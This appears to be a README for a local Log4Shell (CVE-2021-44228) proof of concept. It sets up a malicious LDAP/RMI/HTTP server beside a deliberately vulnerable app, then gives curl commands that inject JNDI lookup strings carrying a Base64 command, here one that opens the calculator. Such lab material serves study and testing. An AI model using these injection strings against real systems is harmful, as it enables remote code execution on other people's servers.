# Log4j CVE-2021-44228 (RCE sample)

## Requisites

Use a vulnerable JDK, for instance [JDK 1.8.0_181](https://www.oracle.com/es/java/technologies/javase/javase8-archive-downloads.html)

## Usage

### Malicious server

The malicious server deploys the following endpoints:
* **1389** LDAP server
* **1099** RMI server
* **8081** HTTP server 


````shell
./gradlew :malicious-server:bootRun
````

### Vulnerable application

The vulnerable application deploys one HTTP endpoint at **8082**
````shell
./gradlew :vulnerable-app:bootRun
````

## Testing

Choose a payload that will be executed byte the remote code execution vulnerability and encode it in Base64, as an example 
in order to open the calculator in Windows use ```Y2FsYy5leGU=```

### LDAP

````shell
curl --header "X-Vulnerable-Header: ${jndi:ldap://localhost:1389/command/Log4j/Y2FsYy5leGU=}" http://127.0.0.1:8082
````

### RMI

````shell
curl --header "X-Vulnerable-Header: ${jndi:rmi://localhost:1099/command/Log4j/Y2FsYy5leGU=}" http://127.0.0.1:8082
````
